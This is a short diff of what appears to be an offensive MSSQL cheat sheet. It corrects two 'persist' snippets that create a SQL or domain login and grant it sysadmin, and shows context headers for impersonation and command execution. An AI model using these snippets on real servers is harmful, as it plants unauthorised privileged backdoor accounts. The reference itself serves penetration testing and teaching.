@@ -92,13 +92,13 @@ EXECUTE AS LOGIN = '<user|sa>'
 ## persist - Create user with sysadmin privs
 ```sql
 CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!'
-sp_addsrvrolemember 'jubeaz', 'sysadmin'
+EXEC sp_addsrvrolemember 'jubeaz', 'sysadmin'
 ```
 
 ## persist - add domain user with sysadmin privs
 ```sql
 create login [<domain_netbios>\<user>] from windows;
-sp_addsrvrolemember 'jubeaz', 'sysadmin';
+EXEC sp_addsrvrolemember 'jubeaz', 'sysadmin';
 ```
 
 ## execute command
